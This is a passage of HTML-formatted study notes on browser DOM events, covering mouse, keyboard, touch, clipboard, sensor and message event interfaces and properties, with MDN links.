<ul><li>when non-zero, provides the current (or next, depending on the event) click count</li> <li>see mouse events</li></ul></li> <li><code>UIEvent.view: WindowProxy</code> read only
<ul><li>return the object from which the event was generated. In browsers, this is the <code>Window</code> object the event happened in</li></ul></li></ul></li></ul></li> <li><p>Resource Events</p> <ul><li><code>cached</code></li> <li><code>error</code></li> <li><code>abort</code></li> <li><code>load</code> <ul><li>dynamically load images, scripts and style sheets: help determine when fully loaded
<ul><li>images begin download as <code>src</code> specified, whereas scripts and style sheets does not begin download until added to the document</li></ul></li> <li>partially loaded: see below <code>DOMContentLoaded</code></li></ul></li> <li><code>beforeunload</code></li> <li><code>unload</code> <ul><li>typically fires when navigating from one page to another</li> <li>most often used to clean up references to avoid memory leaks</li></ul></li></ul></li> <li><p>HTML5 Event</p> <ul><li><code>DOMContentLoaded</code> <ul><li>interface: <code>Event</code> (not <code>UIEvent</code>)</li> <li>fired when the initial HTML document has been completely loaded and parsed, without waiting for stylesheets, images, and subframes to finish loading</li> <li>not fully loaded compared to <code>load</code></li> <li>attach an event handler either on the <code>document</code> or on the <code>window</code> (the <code>target</code> for the event actually is <code>document</code>, although it bubbles up to <code>window</code>)</li> <li>for browsers without support, it has been suggested that a timeout should be set during page loading with a millisecond delay of 0</li></ul></li> <li><code>readystatechange</code> <ul><li>fired when the <code>readyState</code> attribute of a document has changed</li> <li>see before <a href="#html5">HTML5</a> DOM Extensions</li></ul></li></ul></li> <li><p>View Events</p> <ul><li><code>fullscreenchange</code></li> <li><code>fullscreenerror</code></li> <li><code>resize</code> <ul><li>only on <code>window</code></li> <li>can fire at a high rate: IE fire the <code>resize</code> event as soon as the browser is resized by one pixel and then repeatedly as the user resizes the browser window</li></ul></li> <li><code>scroll</code></li></ul></li></ol> <h4 id="focus-events"><a href="#focus-events" class="header-anchor">#</a> Focus Events</h4> <ol><li><p><code>FocusEvent</code></p> <ul><li>constructor: <code>FocusEvent(typeArg: DOMString, eventInitDict?: FocusEventInit)</code></li> <li>inherits: <code>UIEvent</code></li> <li>property
<ul><li><code>FocusEvent.relatedTarget</code> Read only
<ul><li>Is an EventTarget representing a secondary target for this event. As in some cases (like when tabbing in or out a page), this property may be set to <code>null</code> for security reasons.</li></ul></li></ul></li></ul></li> <li><p>Focus Events</p> <ul><li>work in concert with the <code>document.hasFocus()</code> and <code>document.activeElement</code></li> <li><code>blur</code> — An element has lost focus (does not bubble)</li> <li><code>focus</code> — An element has received focus (does not bubble)</li> <li><code>focusin</code> — An element is about to receive focus (bubbles)</li> <li><code>focusout</code> — An element is about to lose focus (bubbles)</li> <li>order
<ol><li><code>focusout</code> fires on the element losing focus</li> <li><code>focusin</code> fires on the element receiving focus</li> <li><code>blur</code> fires on the element losing focus</li> <li><code>focus</code> fires on the element receiving focus</li></ol></li></ul></li></ol> <h4 id="mouse-and-wheel-events"><a href="#mouse-and-wheel-events" class="header-anchor">#</a> Mouse and Wheel Events</h4> <ol><li><p><code>MouseEvent</code></p> <ul><li>constructor: <code>MouseEvent(typeArg: DOMString, eventInitDict?: MouseEventInit)</code></li> <li>inherits: <code>UIEvent</code></li> <li>coordinate properties
<ul><li><code>MouseEvent.clientX</code> Read only — The X coordinate of the mouse pointer in local (DOM content) coordinates
<ul><li>experimental alias: <code>MouseEvent.x</code></li></ul></li> <li><code>MouseEvent.clientY</code> Read only — The Y coordinate of the mouse pointer in local (DOM content) coordinates
<ul><li>experimental alias: <code>MouseEvent.y</code></li></ul></li> <li><code>MouseEvent.pageX</code> Read only — The X coordinate of the mouse pointer relative to the whole document</li> <li><code>MouseEvent.pageY</code> Read only — The Y coordinate of the mouse pointer relative to the whole document</li> <li><code>MouseEvent.screenX</code> Read only — The X coordinate of the mouse pointer in global (screen) coordinates</li> <li><code>MouseEvent.screenY</code> Read only — The Y coordinate of the mouse pointer in global (screen) coordinates</li> <li><code>MouseEvent.offsetX</code> Read only — The X coordinate of the mouse pointer relative to the position of the padding edge of the target node</li> <li><code>MouseEvent.offsetY</code> Read only — The Y coordinate of the mouse pointer relative to the position of the padding edge of the target node</li></ul></li> <li>modifier key properties: return a Boolean indicating whether the key was down
<ul><li><code>MouseEvent.altKey</code> Read only</li> <li><code>MouseEvent.ctrlKey</code> Read only</li> <li><code>MouseEvent.shiftKey</code> Read only</li> <li><code>MouseEvent.metaKey</code> Read only: ⌘ or ⊞
<ul><li>not IE8 and earlier</li></ul></li></ul></li> <li>related element property — <code>MouseEvent.relatedTarget</code> read only
<ul><li>next <code>EventTarget</code> for the below, or <code>null</code></li> <li><code>mouseenter</code></li> <li><code>mouseleave</code></li> <li><code>mouseout</code></li> <li><code>mouseover</code></li></ul></li> <li>button property
<ul><li><code>MouseEvent.button</code> read only: returns a number
<ul><li><code>0</code>: Main button pressed, usually the left button or the un-initialized state</li> <li><code>1</code>: Auxiliary button pressed, usually the wheel button or the middle button (if present)</li> <li><code>2</code>: Secondary button pressed, usually the right button</li> <li><code>3</code>: Fourth button, typically the Browser Back button</li> <li><code>4</code>: Fifth button, typically the Browser Forward button</li> <li>not reliable for events such as <code>mouseenter</code>, <code>mouseleave</code>, <code>mouseover</code>, <code>mouseout</code> or <code>mousemove</code></li></ul></li> <li><code>MouseEvent.buttons</code> read only
<ul><li><code>MouseEvent.buttons</code> property indicates the state of buttons pressed during any kind of mouse event</li> <li>while the <code>MouseEvent.button</code> property only guarantees the correct value for mouse events caused by pressing or releasing one or multiple buttons</li> <li>return: A number representing one or more buttons</li> <li><code>0</code>  : No button or un-initialized</li> <li><code>1</code>  : Primary button (usually left)</li> <li><code>2</code>  : Secondary button (usually right)</li> <li><code>4</code>  : Auxiliary button (usually middle or mouse wheel button)</li> <li><code>8</code>  : 4th button (typically the &quot;Browser Back&quot; button)</li> <li><code>16</code> : 5th button (typically the &quot;Browser Forward&quot; button)</li></ul></li></ul></li></ul></li> <li><p><code>WheelEvent</code></p> <ul><li>constructor: <code>WheelEvent(typeArg: DOMString, eventInitDict?: WheelEventInit)</code></li> <li>inherits: <code>MouseEvent</code></li> <li>do not confuse with scroll event
<ul><li>do not rely on delta properties to get the content's scrolling direction</li></ul></li> <li>properties
<ul><li><code>WheelEvent.deltaX</code> Read only — Returns a double representing the horizontal scroll amount</li> <li><code>WheelEvent.deltaY</code> Read only — Returns a double representing the vertical scroll amount</li> <li><code>WheelEvent.deltaZ</code> Read only — Returns a double representing the scroll amount for the z-axis</li> <li><code>WheelEvent.deltaMode</code> Read only — Returns an unsigned long representing the unit of the delta values scroll amount. Permitted values are:
<ul><li><code>DOM_DELTA_PIXEL</code> <code>0x00</code> The delta values are specified in pixels.</li> <li><code>DOM_DELTA_LINE</code> <code>0x01</code> The delta values are specified in lines.</li> <li><code>DOM_DELTA_PAGE</code> <code>0x02</code> The delta values are specified in pages.</li></ul></li></ul></li></ul></li> <li><p>Mouse and Wheel Events</p> <ul><li><code>mouseenter</code>: A pointing device is moved onto the element that has the listener attached.
<ul><li>does not bubble</li></ul></li> <li><code>mouseover</code>: A pointing device is moved onto the element that has the listener attached or onto one of its children.</li> <li><code>mousemove</code>: A pointing device is moved over an element. (Fired continuously as the mouse moves.)</li> <li><code>mousedown</code>: A pointing device button is pressed on an element.</li> <li><code>mouseup</code>: A pointing device button is released over an element.</li> <li><code>auxclick</code>: A pointing device button (ANY non-primary button) has been pressed and released on an element.</li> <li><code>click</code>: A pointing device button (ANY button; soon to be primary button only) has been pressed and released on an element
<ul><li>also <code>Enter</code> key</li></ul></li> <li><code>dblclick</code>: A pointing device button is clicked twice on an element.</li> <li><code>contextmenu</code>: The right button of the mouse is clicked (before the context menu is displayed).</li> <li><code>mouseleave</code>: A pointing device is moved off the element that has the listener attached.
<ul><li>does not bubble</li></ul></li> <li><code>mouseout</code>: A pointing device is moved off the element that has the listener attached or off one of its children.</li> <li><code>select</code>: Some text is being selected.</li> <li><code>pointerlockchange</code>: The pointer was locked or released.</li> <li><code>pointerlockerror</code>: It was impossible to lock the pointer for technical reasons or because the permission was denied.</li> <li><code>wheel</code>: A wheel button of a pointing device is rotated in any direction.
<ul><li><code>mousewheel</code> for IE8 and earlier along with older browsers</li></ul></li></ul></li> <li><p>order of occurrence</p> <ul><li>order
<ol><li><code>mousedown</code></li> <li><code>mouseup</code></li> <li><code>click</code></li> <li><code>mousedown</code> <ul><li>skipped in IE8 and earlier</li></ul></li> <li><code>mouseup</code></li> <li><code>click</code> <ul><li>skipped in IE8 and earlier</li></ul></li> <li><code>dblclick</code></li></ol></li> <li>Both <code>click</code> and <code>dblclick</code> rely on other events to fire before they can fire, whereas <code>mousedown</code> and <code>mouseup</code> are not affected by other events</li></ul></li> <li><p>Touch Device Support: Touch events</p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Touch_events" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>to be continued</li></ul></li></ol> <h4 id="keyboard-and-text-events"><a href="#keyboard-and-text-events" class="header-anchor">#</a> Keyboard and Text Events</h4> <ol><li><p><code>KeyboardEvent</code></p> <ul><li>constructor: <code>KeyboardEvent(typeArg: DOMString, eventInitDict?: KeyboardEventInit)</code></li> <li>inherits: <code>UIEvent</code></li> <li>methods
<ul><li><code>KeyboardEvent.getModifierState(keyArg: string): boolean</code> <ul><li>no safari and opera support ???</li> <li>more powerful than properties but maybe slower</li> <li>returns the current state of the specified modifier key: <code>true</code> if the modifier is active (that is the modifier key is pressed or locked), otherwise, <code>false</code></li> <li>keyArg: <code>'Alt'</code>, <code>'NumLock'</code>... (<a href="https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/getModifierState#Modifier_keys_on_Gecko" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>)</li></ul></li></ul></li> <li>properties
<ul><li><code>KeyboardEvent.code</code> Read only
<ul><li>Returns a <code>DOMString</code> with the code value of the key represented by the event</li> <li>handle keys based on their physical positions on the input device rather than the characters associated with</li> <li>returned is <code>&quot;KeyQ&quot;</code> is for the &quot;q&quot; key on a QWERTY layout keyboard, but the same code value also represents the &quot;'&quot; key on Dvorak keyboards and the &quot;a&quot; key on AZERTY keyboards</li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/code#Code_values" target="_blank" rel="noopener noreferrer">code value list<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><code>KeyboardEvent.key</code> Read only
<ul><li>Returns a <code>DOMString</code> representing the key value of the key represented by the event</li> <li>taking into considerations the state of modifier keys such as the shiftKey as well as the keyboard locale/layout</li> <li>key has a printed representation: <code>&quot;a&quot;</code>, <code>&quot;A&quot;</code></li> <li>key is a control or special character, return <a href="https://developer.mozilla.org/docs/Web/API/KeyboardEvent/key/Key_Values" target="_blank" rel="noopener noreferrer">pre-defined key values<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>key is a dead key (grave accent for à), return <code>&quot;Dead&quot;</code></li> <li>Some specialty keyboard keys don't generate key codes on Windows; instead, they trigger <code>WM_APPCOMMAND</code> events</li> <li>If the key cannot be identified, the returned value is <code>&quot;Unidentified&quot;</code></li></ul></li> <li><code>KeyboardEvent.altKey</code> Read only</li> <li><code>KeyboardEvent.ctrlKey</code> Read only</li> <li><code>KeyboardEvent.shiftKey</code> Read only</li> <li><code>KeyboardEvent.metaKey</code> Read only</li> <li><code>KeyboardEvent.isComposing</code> Read only
<ul><li>Returns a Boolean that is true if the event is fired between after <code>compositionstart</code> and before <code>compositionend</code></li> <li>such as voice input, IMEs</li></ul></li> <li><code>KeyboardEvent.location: number</code> Read only: returns
<ul><li><code>KeyboardEvent.DOM_KEY_LOCATION_STANDARD</code> 0: no left or right version, and not on numpad</li> <li><code>KeyboardEvent.DOM_KEY_LOCATION_LEFT</code> 1</li> <li><code>KeyboardEvent.DOM_KEY_LOCATION_RIGHT</code> 2</li> <li><code>KeyboardEvent.DOM_KEY_LOCATION_NUMPAD</code> 3</li> <li><code>NumLock</code> is 0 but not 3</li></ul></li> <li><code>KeyboardEvent.repeat</code> Read only
<ul><li>Returns a Boolean that is true if the key is being held down such that it is automatically repeating</li></ul></li></ul></li></ul></li> <li><p>Keyboard Events</p> <ul><li>When you need to handle text input, use HTML5 <code>input</code> event instead</li> <li><code>keydown</code>: ANY key is pressed (Fired continuously.)</li> <li><code>keypress</code>: ANY key except Shift, Fn, CapsLock is in pressed (Fired continuously.)
<ul><li>not for toggle keys, Caps Lock, Num Lock, and Scroll Lock</li></ul></li> <li><code>keyup</code>: ANY key is released</li> <li>when key held down and <code>KeyboardEvent.repeat</code> becomes <code>true</code> <ul><li>loop: <code>keydown</code>, <code>keypress</code></li> <li><code>keyup</code> when stop</li> <li>GTK environments such as Ubuntu 9.4 also loop <code>keyup</code></li></ul></li></ul></li> <li><p>text events: HTML5 <code>Event</code> type</p> <ul><li>fired synchronously when the value of an <code>&lt;input&gt;</code>, <code>&lt;select&gt;</code>, or <code>&lt;textarea&gt;</code> element is changed</li> <li>For <code>input</code> elements with <code>type=checkbox</code> or <code>type=radio</code>, the input event should fire when a user toggles the control, but historically, this has not been the case
<ul><li>attach to the <code>change</code> event instead</li></ul></li> <li>Additionally, the input event fires on a <code>contenteditable</code> editor when its contents are changed
<ul><li>In this case, the event target is the editing host element</li> <li>If there are two or more elements which have <code>contenteditable</code> as <code>true</code>, “editing host” is the nearest ancestor element whose parent isn’t editable</li> <li>Similarly, it’s also fired on root element of <code>designMode</code> editors</li></ul></li> <li><code>change</code> fires less often than input – it only fires when the changes are committed by the user</li> <li><code>input</code></li></ul></li></ol> <h4 id="composition-events"><a href="#composition-events" class="header-anchor">#</a> Composition Events</h4> <ol><li><p><code>CompositionEvent</code></p> <ul><li>events that occur due to the user indirectly entering text
<ul><li>typically found on IMEs</li></ul></li> <li>constructor: <code>CompositionEvent(typeArg: DOMString, eventInitDict?: CompositionEventInit)</code></li> <li>inherits: <code>UIEvent</code></li> <li>properties
<ul><li><code>CompositionEvent.data</code> Read only
<ul><li>Returns the characters generated by the input method that raised the event</li> <li>varies depending on the type of event that generated the <code>CompositionEvent</code> object</li> <li>For <code>compositionstart</code> events, this is the currently selected text that will be replaced by the string being composed. This value doesn't change even if content changes the selection range; rather, it indicates the string that was selected when composition started</li> <li>For <code>compositionupdate</code>, this is the string as it stands currently as editing is ongoing</li> <li>For <code>compositionend</code> events, this is the string as committed to the editor</li></ul></li></ul></li></ul></li> <li><p>Text Composition Events</p> <ul><li><code>compositionstart</code> — The composition of a passage of text is prepared (similar to <code>keydown</code> for a keyboard input, but works with other inputs such as speech recognition)</li> <li><code>compositionupdate</code> — A character is added to a passage of text being composed</li> <li><code>compositionend</code> — The composition of a passage of text has been completed or canceled</li></ul></li></ol> <h4 id="session-history-events"><a href="#session-history-events" class="header-anchor">#</a> Session History Events</h4> <ol><li><p><code>PageTransitionEvent</code></p> <ul><li>fired when a document is being loaded or unloaded
<ul><li>browser back-forward cache (bfcache) feature to speed up page transitions when using the browser’s Back and Forward buttons</li></ul></li> <li>event handlers better attached to <code>window</code></li> <li>inherits: <code>Event</code></li> <li>properties
<ul><li><code>PageTransitionEvent.persisted: boolean</code> Read only
<ul><li>Indicates if the document is loading from a cache</li></ul></li></ul></li></ul></li> <li><p>Session History Events</p> <ul><li><code>pagehide</code> — A session history entry is being traversed from
<ul><li>fires immediately before the <code>unload</code> event</li></ul></li> <li><code>pageshow</code> — A session history entry is being traversed to
<ul><li>On a newly loaded page, <code>pageshow</code> fires after the <code>load</code> event</li></ul></li> <li><code>popstate</code> (<code>PopStateEvent</code> interface) — A session history entry is being navigated to (in certain cases)</li></ul></li> <li><p><code>hashchange</code> event</p> <ul><li>the fragment identifier (<code>#</code>) of the URL has changed</li> <li>interface: <code>HashChangeEvent</code> <ul><li>properties
<ul><li><code>HashChangeEvent.newURL</code> Read only — The new URL to which the window is navigating</li> <li><code>HashChangeEvent.oldURL</code> Read only — The previous URL from which the window was navigated</li></ul></li></ul></li></ul></li></ol> <h4 id="sensor-events"><a href="#sensor-events" class="header-anchor">#</a> Sensor Events</h4> <ol><li><p><code>deviceorientation</code> event: experimental WD</p> <ul><li>fired when fresh data is available from an orientation sensor about the current orientation of the device as compared to the Earth coordinate frame</li> <li>interface: <code>DeviceOrientationEvent</code></li> <li>constructor: <code>DeviceOrientationEvent(typeArg: DOMString, eventInitDict?: DeviceOrientationEventInit)</code></li> <li>properties
<ul><li><code>DeviceOrientationEvent.absolute</code> Read only — A boolean that indicates whether or not the device is providing orientation data absolutely</li> <li><code>DeviceOrientationEvent.alpha</code> Read only — A number representing the motion of the device around the z axis, express in degrees with values ranging from 0 to 360</li> <li><code>DeviceOrientationEvent.beta</code> Read only — A number representing the motion of the device around the x axis, express in degrees with values ranging from -180 to 180. This represents a front to back motion of the device</li> <li><code>DeviceOrientationEvent.gamma</code> Read only — A number representing the motion of the device around the y axis, express in degrees with values ranging from -90 to 90. This represents a left to right motion of the device</li></ul></li></ul></li> <li><p><code>devicemotion</code> event: experimental WD</p> <ul><li>fired at a regular interval and indicates the amount of physical force of acceleration the device is receiving at that time
<ul><li>It also provides information about the rate of rotation, if available.</li></ul></li> <li>interface: <code>DeviceMotionEvent</code></li> <li>properties
<ul><li>If the hardware isn't capable of providing this information, this property returns <code>null</code></li> <li><code>DeviceMotionEvent.acceleration</code> Read only — An object with properties <code>x</code>, <code>y</code> and <code>z</code> giving the acceleration of the device on the three axis X, Y and Z. Acceleration is expressed in m/s^2^</li> <li><code>DeviceMotionEvent.accelerationIncludingGravity</code> Read only — An object with properties <code>x</code>, <code>y</code> and <code>z</code> giving the acceleration of the device on the three axis X, Y and Z with the effect of gravity. Acceleration is expressed in m/s^2^</li> <li><code>DeviceMotionEvent.rotationRate</code> Read only — An object with properties <code>alpha</code>, <code>beta</code> and <code>gamma</code> giving the rate of change of the device's orientation on the three orientation axis alpha, beta and gamma. Rotation rate is expressed in degrees per seconds</li> <li><code>DeviceMotionEvent.interval</code> Read only — A number representing the interval of time, in milliseconds, at which data is obtained from the device</li></ul></li></ul></li></ol> <h4 id="touch-events"><a href="#touch-events" class="header-anchor">#</a> Touch Events</h4> <p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Touch_events" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <ol><li><p>Touch Events: <code>TouchEvent</code></p> <ul><li>in many cases, both touch and mouse events get sent. If you use touch events, you should call <code>preventDefault()</code> to keep the mouse event from being sent
<ul><li>The exception to this is Chrome, starting with version 56</li></ul></li> <li>constructor: <code>TouchEvent(typeArg: DOMString, eventInitDict?: TouchEventInit)</code></li> <li>inherits: <code>UIEvent</code></li> <li>types
<ul><li><code>touchstart</code> — Fires when a finger touches the screen even if another finger is already touching the screen</li> <li><code>touchmove</code> — Fires continuously as a finger is moved across the screen. Calling <code>preventDefault()</code> during this event prevents scrolling</li> <li><code>touchend</code> — Fires when a finger is removed from the screen</li> <li><code>touchcancel</code> — Fires when the system has stopped tracking the touch. It’s unclear in the documentation as to when this can occur</li></ul></li> <li>properties
<ul><li>keys (read only): <code>TouchEvent.altKey</code>, <code>TouchEvent.ctrlKey</code>, <code>TouchEvent.metaKey</code>, <code>TouchEvent.shiftKey</code></li> <li><code>TouchEvent.touches</code> Read only
<ul><li>A <code>TouchList</code> of all the <code>Touch</code> objects representing all current points of contact with the surface, regardless of target or changed status</li></ul></li> <li><code>TouchEvent.targetTouches</code> Read only
<ul><li>A TouchList of all the Touch objects that are both currently in contact with the touch surface <strong>and</strong> were also started on the same element that is the target of the event</li></ul></li> <li><code>TouchEvent.changedTouches</code> Read only
<ul><li>A <code>TouchList</code> of all the <code>Touch</code> objects representing individual points of contact whose states changed between the previous touch event and this one</li></ul></li></ul></li> <li><code>GlobalEventHandlers</code>: <code>on</code> prefix: ED: Editor's Draft</li> <li>order of events when you tap on an element
<ol><li><code>touchstart</code></li> <li><code>mouseover</code></li> <li><code>mousemove</code> (once)</li> <li><code>mousedown</code></li> <li><code>mouseup</code></li> <li><code>click</code></li> <li><code>touchend</code></li></ol></li></ul></li> <li><p><code>Touch</code> objects</p> <ul><li><code>TouchList</code>: <code>length</code>, <code>item()</code> and bracket notation</li> <li>constructor: <code>Touch(TouchInitDict: TouchInit)</code></li> <li>inherits: no parent</li> <li>properties
<ul><li><code>Touch.identifier</code> Read only — Returns a unique identifier for this Touch object. A given touch point (say, by a finger) will have the same identifier for the duration of its movement around the surface. This lets you ensure that you're tracking the same touch all the time</li> <li><code>Touch.screenX</code> Read only — Returns the X coordinate of the touch point relative to the left edge of the screen</li> <li><code>Touch.screenY</code> Read only — Returns the Y coordinate of the touch point relative to the top edge of the screen</li> <li><code>Touch.clientX</code> Read only — Returns the X coordinate of the touch point relative to the left edge of the browser viewport, not including any scroll offset</li> <li><code>Touch.clientY</code> Read only — Returns the Y coordinate of the touch point relative to the top edge of the browser viewport, not including any scroll offset</li> <li><code>Touch.pageX</code> Read only — Returns the X coordinate of the touch point relative to the left edge of the document. Unlike clientX, this value includes the horizontal scroll offset, if any</li> <li><code>Touch.pageY</code> Read only — Returns the Y coordinate of the touch point relative to the top of the document. Unlike clientY, this value includes the vertical scroll offset, if any</li> <li><code>Touch.target</code> Read only — Returns the Element on which the touch point started when it was first placed on the surface, even if the touch point has since moved outside the interactive area of that element or even been removed from the document</li></ul></li> <li>experimental touch area properties
<ul><li><code>Touch.radiusX</code> Read only — Returns the X radius of the ellipse that most closely circumscribes the area of contact with the screen. The value is in pixels of the same scale as <code>screenX</code></li> <li><code>Touch.radiusY</code> Read only — Returns the Y radius of the ellipse that most closely circumscribes the area of contact with the screen. The value is in pixels of the same scale as <code>screenY</code></li> <li><code>Touch.rotationAngle</code> Read only — Returns the angle (in degrees) that the ellipse described by radiusX and radiusY must be rotated, clockwise, to most accurately cover the area of contact between the user and the surface</li> <li><code>Touch.force</code> Read only — Returns the amount of pressure being applied to the surface by the user, as a float between 0.0 (no pressure) and 1.0 (maximum pressure)</li></ul></li></ul></li></ol> <h4 id="clipboard-events"><a href="#clipboard-events" class="header-anchor">#</a> Clipboard Events</h4> <ol><li><p><code>ClipboardEvent</code></p> <ul><li>constructor: <code>ClipboardEvent(typeArg: DOMString, eventInitDict?: ClipboardEventInit)</code></li> <li>inherits: <code>Event</code></li> <li>properties
<ul><li><code>ClipboardEvent.clipboardData</code> Read only
<ul><li>Is a <code>DataTransfer</code> object containing the data affected by the user-initiated <code>cut</code>, <code>copy</code>, or <code>paste</code> operation, along with its MIME type.</li> <li><code>window.clipboardData</code> for IE</li></ul></li></ul></li> <li>properties of <code>DataTransfer</code> <ul><li><code>DataTransfer.dropEffect</code>: <code>none</code></li> <li><code>DataTransfer.effectAllowed</code>: <code>uninitialized</code></li> <li><code>DataTransfer.types</code> Read only: <code>&quot;&quot;</code></li> <li><code>DataTransfer.files</code>: empty <code>FileList</code></li> <li><code>DataTransfer.items</code> Read only: empty <code>DataTransferItemList</code></li></ul></li> <li>methods of <code>DataTransfer</code> <ul><li><code>DataTransfer.setData(format: string, data: string): void</code> <ul><li>format: MIME type: <code>&quot;text/plain&quot;</code>, <code>&quot;text/html&quot;</code>, <code>&quot;text/uri-list&quot;</code>, <code>&quot;image/jpeg&quot;</code>, etc.</li> <li><code>&quot;text&quot;</code>, <code>&quot;Text&quot;</code>, <code>&quot;URL&quot;</code> for IE</li></ul></li> <li><code>DataTransfer.getData(format: string)</code> <ul><li>not for <code>copy</code> and <code>cut</code></li></ul></li> <li><code>DataTransfer.clearData(format?: string)</code> <ul><li>if format is not specified, the data associated with all types is removed</li></ul></li></ul></li></ul></li> <li><p><code>ClipboardEvent</code> types</p> <ul><li><code>cut</code> — The selection has been cut and copied to the clipboard</li> <li><code>copy</code> — The selection has been copied to the clipboard</li> <li><code>paste</code> — The item from the clipboard has been pasted</li></ul></li></ol> <h4 id="message-events"><a href="#message-events" class="header-anchor">#</a> Message Events</h4> <ol><li><p>availability</p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/MessageEvent" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>Server-sent events (see <code>EventSource.onmessage</code>)</li> <li>Web sockets (see the onmessage property of the <code>WebSocket</code> interface)</li> <li>Cross-document messaging (see <code>Window.postMessage()</code> and <code>Window.onmessage</code>)</li> <li>Channel messaging (see <code>MessagePort.postMessage()</code> and <code>MessagePort.onmessage</code>)</li> <li>Cross-worker/document messaging (see the above two entries, but also <code>Worker.postMessage()</code>, <code>Worker.onmessage</code>, <code>ServiceWorkerGlobalScope.onmessage</code>, etc.)</li> <li>Broadcast channels (see <code>Broadcastchannel.postMessage()</code> and <code>BroadcastChannel.onmessage</code>)</li> <li>WebRTC data channels (see <code>RTCDataChannel.onmessage</code>)</li></ul></li> <li><p><code>MessageEvent</code></p> <ul><li>constructor: <code>MessageEvent(type: &quot;message&quot;, eventInitDict?: MessageEventInit)</code></li> <li>inherits: <code>Event</code></li> <li>properties
<ul><li><code>MessageEvent.data</code> Read only — The data sent by the message emitter</li> <li><code>MessageEvent.origin</code> Read only — A <code>USVString</code> representing the origin of the message emitter
<ul><li>For IDN host names only, the value of the origin property is not consistently Unicode or punycode</li> <li>for greatest compatibility check for both the IDN and punycode values when using this property if you expect messages from IDN sites</li></ul></li> <li><code>MessageEvent.lastEventId</code> Read only — A <code>DOMString</code> representing a unique ID for the event</li> <li><code>MessageEvent.source</code> Read only — A <code>MessageEventSource</code> (which can be a <code>WindowProxy</code>, <code>MessagePort</code>, or <code>ServiceWorker</code> object) representing the message emitter</li> <li><code>MessageEvent.ports</code> Read only — An array of <code>MessagePort</code> objects representing the ports associated with the channel the message is being sent through (where appropriate, e.g. in channel messaging or when sending a message to a shared worker)</li></ul></li> <li>event types
<ul><li><code>message</code> — fired when message received
<ul><li>important to verify <code>origin</code> and <code>source</code></li></ul></li></ul></li></ul></li></ol> <h4 id="drag-drop-events"><a href="#drag-drop-events" class="header-anchor">#</a> Drag &amp; Drop Events</h4> <ol><li><p><code>DragEvent</code></p> <ul><li>HTML5 specification, not IE9 and before</li> <li>HTML <code>draggable</code> attribute — indicates whether the element can be dragged
<ul><li>enumerated attribute, can set to <code>true</code>, <code>false</code>, <code>auto</code></li></ul></li> <li>make HTML element draggable
